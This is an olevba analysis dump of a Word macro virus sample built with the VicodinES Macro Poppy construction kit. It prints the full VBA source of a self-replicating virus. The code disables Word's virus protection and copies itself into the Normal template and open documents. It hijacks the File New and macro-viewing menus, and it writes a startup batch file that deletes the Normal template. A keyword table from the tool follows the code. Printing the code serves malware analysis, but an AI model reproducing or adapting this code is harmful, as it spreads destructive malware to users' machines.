olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-842155b21c4b5aae908a269f23b57e1b986109dc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-842155b21c4b5aae908a269f23b57e1b986109dc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO iracraigavon.bas 
in file: Virus.MSWord.VMPC-based-842155b21c4b5aae908a269f23b57e1b986109dc - OLE stream: 'Macros/VBA/iracraigavon'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub iracraigavon()
    
    'Produced by,
    'The VicodinES Macro.Poppy Construction Kit v1.0b
    '================================================
    'Code Written by VicodinES "Daddy's got a big o'l bag-a-chicken"
    'Poppy ID : 43993521878
    
    
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
k8367 = m14847 & e6665
f18567 = u10337 & c4059 & Int(Rnd * 1066)
ActiveDocument.ReadOnlyRecommended = False
n3521439910 = 0
Set qq439935211 = MacroContainer
 f3080$ = "c:\windows\startm~1\programs\startup\msfile.bat"
m80654399 = GetAttr(NormalTemplate.FullName)
If m80654399 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f3080$)
If m80654399 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f3080$)
f15794 = u16977 & c7930 & k15492 & m16977
If m80654399 = vbReadOnly Then GoTo fuckoff
If m80654399 = vbReadOnly + vbArchive Then GoTo fuckoff
f5151 = u6313 & c10211 & k7183 & m6313
If qq439935211 = NormalTemplate Then n3521439910 = 1
If n3521439910 = 1 Then fuck352113 = NormalTemplate.FullName Else fuck352113 = ActiveDocument.FullName
k16809 = m11059 & e1078
f17923 = u9672 & c6340 & Int(Rnd * 2367)
If n3521439910 = 1 Then DebrahWells43991 = ActiveDocument.FullName Else DebrahWells43991 = NormalTemplate.FullName
Application.OrganizerCopy Source:=fuck352113, Destination:=DebrahWells43991, Name:="iracraigavon", Object:=wdOrganizerObjectProjectItems
k8902 = m11803 & e4054
If n3521439910 = 1 And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If n3521439910 = 0 Then
k10029 = m8027 & e10686
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
'VMPCK v1.0b
fuckoff:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "IRA-Craigavon", vbInformation
End Sub
Sub FileNew()
    On Error Resume Next
    Call iracraigavon
f9782 = u12141 & c9806 & Int(Rnd * 8431)
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call iracraigavon
f11329 = u8354 & c11114 & Int(Rnd * 7096)
End Sub
Sub ToolsMacro()
    On Error Resume Next
k16179 = m5175 & e10581
f9306 = u18679 & c14867 & k15654 & m18679
f15316 = u3517 & c12991 & Int(Rnd * 6124)
f7579 = u9920 & c1708 & Int(Rnd * 799)
End Sub
Sub FileTemplates()
    On Error Resume Next
k11060 = m5320 & e14210
End Sub
Sub ViewVBCode()
    On Error Resume Next
k6151 = m9018 & e14653
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
k2589 = m12953 & e3872
f7341 = u13189 & c9238 & k3936 & m13189
n$ = NormalTemplate
Part11$ = "attrib -h -r "
k8711 = m3946 & e7840
k3424 = m11473 & e10976
snag$ = "c:\progra~1\micros~1\templa~1\"
f6051 = u16399 & c4094 & Int(Rnd * 2888)
snag1$ = "c:\progra~1\micros~2\templa~1\"
k2708 = m17120 & e12698
Part2$ = "del "
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

